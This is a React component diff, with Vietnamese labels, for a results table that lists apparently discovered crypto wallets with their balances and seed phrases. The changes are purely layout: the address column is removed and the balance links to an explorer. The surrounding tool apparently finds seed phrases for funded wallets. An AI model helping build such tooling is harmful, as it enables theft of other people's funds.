@@ -9,7 +9,7 @@ import {
   TableRow 
 } from '@/components/ui/table';
 import { Button } from '@/components/ui/button';
-import { Copy, ExternalLink } from 'lucide-react';
+import { Copy, ExternalLink, RefreshCw } from 'lucide-react';
 import { WalletWithBalance } from '../types';
 import { getBlockchainName, getBlockchainIcon, getBlockchainColor } from './icons/BlockchainIcons';
 import { cn } from '@/lib/utils';
@@ -55,9 +55,12 @@ export function ResultsTable({ walletsWithBalance, onReset }: ResultsTableProps)
   return (
     <div className="border rounded-lg p-4 bg-card space-y-4">
       <div className="flex justify-between items-center">
-        <h3 className="text-lg font-semibold">Ví có số dư ({walletsWithBalance.length})</h3>
-        <Button variant="ghost" size="sm" onClick={onReset}>
-          Reset danh sách
+        <h3 className="text-lg font-semibold">({walletsWithBalance.length})</h3>
+        <Button variant="ghost" size="sm" onClick={onReset} className="h-8 w-8 p-0">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-4 w-4">
+            <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"></path>
+            <path d="M3 3v5h5"></path>
+          </svg>
         </Button>
       </div>
       
@@ -66,10 +69,8 @@ export function ResultsTable({ walletsWithBalance, onReset }: ResultsTableProps)
         <TableHeader>
           <TableRow>
             <TableHead>Blockchain</TableHead>
-            <TableHead>Địa chỉ</TableHead>
+            <TableHead>Seed Phrase</TableHead>
             <TableHead className="text-right">Số dư</TableHead>
-            <TableHead className="text-right">Seed Phrase</TableHead>
-            <TableHead className="w-[100px]">Hành động</TableHead>
           </TableRow>
         </TableHeader>
         <TableBody>
@@ -87,22 +88,6 @@ export function ResultsTable({ walletsWithBalance, onReset }: ResultsTableProps)
                 </TableCell>
                 <TableCell className="font-mono text-xs">
                   <div className="flex items-center space-x-2">
-                    <span className="truncate max-w-[120px]">{wallet.address}</span>
-                    <Button 
-                      variant="ghost" 
-                      size="icon" 
-                      className="h-6 w-6"
-                      onClick={() => copyToClipboard(wallet.address, 'Đã sao chép địa chỉ')}
-                    >
-                      <Copy className="h-3 w-3" />
-                    </Button>
-                  </div>
-                </TableCell>
-                <TableCell className="text-right font-mono">
-                  {wallet.balance} {wallet.blockchain}
-                </TableCell>
-                <TableCell className="text-right font-mono text-xs">
-                  <div className="flex items-center justify-end space-x-2">
                     <span className="truncate max-w-[150px]">{wallet.seedPhrase}</span>
                     <Button 
                       variant="ghost" 
@@ -114,17 +99,17 @@ export function ResultsTable({ walletsWithBalance, onReset }: ResultsTableProps)
                     </Button>
                   </div>
                 </TableCell>
-                <TableCell>
-                  <a 
-                    href={getExplorerLink(wallet.blockchain, wallet.address)} 
-                    target="_blank" 
-                    rel="noopener noreferrer"
-                  >
-                    <Button variant="outline" size="sm" className="w-full">
-                      <ExternalLink className="h-3 w-3 mr-1" />
-                      Xem
-                    </Button>
-                  </a>
+                <TableCell className="text-right font-mono">
+                  <div className="flex items-center justify-end space-x-2">
+                    <a 
+                      href={getExplorerLink(wallet.blockchain, wallet.address)} 
+                      target="_blank" 
+                      rel="noopener noreferrer"
+                      className="text-blue-500 underline hover:no-underline"
+                    >
+                      {wallet.balance} {wallet.blockchain}
+                    </a>
+                  </div>
                 </TableCell>
               </TableRow>
             );
